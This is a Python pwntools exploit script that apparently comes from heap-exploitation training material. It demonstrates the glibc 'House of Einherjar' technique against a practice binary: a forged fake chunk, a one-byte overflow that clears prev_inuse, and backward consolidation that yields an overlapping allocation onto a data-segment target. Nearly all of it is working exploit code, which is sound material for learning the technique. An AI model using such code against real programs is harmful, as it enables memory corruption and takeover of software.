#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("house_of_einherjar")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

io = start()

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Populate the username field.
username = (p64(0) + p64(0x8) +
            # size of target chunk should at least
            # be large enough to overlap desired target
            p64(elf.sym.user) + p64(elf.sym.user)
            # passing safe unlinking checks
            )

io.sendafter(b"username: ", username)

# This program leaks its default heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")

# Request 2 chunks.
chunk_A = malloc(0x88)
chunk_B = malloc(0xf8)

# 1. Triggering one-byte overflow, clearing chunk_B's prev_inuse flag.
#    Also don't forget to provide a valid prev_size field of succeeding chunk.
prev_size = (heap + 0x90) - (elf.sym.user) # distance between chunk_B and target
edit(chunk_A, p8(0)*0x80 + p64(prev_size))

# 2. Now, when freeing chunk_B, due to its cleared prev_inuse bit, it get's
#    consolidated with chunk_A. Addition of sizes (faked prev_size and chunk_A's
#    original size) should lead to desired target location.
#    Therefore, for passing safe unlinking checks, as usual target chunk should be
#    crafted accordingly.
#
# 3. To pass the size vs. prev_size check (chunksize(P) != prev_size (next_chunk(P))), keep in mind that the involved macros
#    chunksize and prev_size just take the metadata residing in victim chunk (user struct in data segment) as
#    foundation for their calculations.
#    As it turns out a size value of 8 is passing this check
# =============================================================================

free(chunk_B)

# 4. Due to the consolidation of chunks, the fake chunk now ends up as the new top_chunk.
#    This is a more desirable state than getting it ended up in unsortedbin, due to it's
#    integrity checks. Glibc versions below 2.28 don't have any top_chunk size integrity checks.
#
overlap = malloc(0x88)
edit(overlap, b"Z"*16 + b"Much win!")

io.interactive()

# Notes:
# One noticeable fact is, that if under production conditions, when
# the distance between chunk_B and our target could be really large
# due to allocation of data and heap segments under ASLR conditions,
# the distance could be to large to pass unsortedbin integrity checks.
# Also keep in mind, that this could also influence anz possible
# top_chunk integrity checks for glibc >= 2.28.
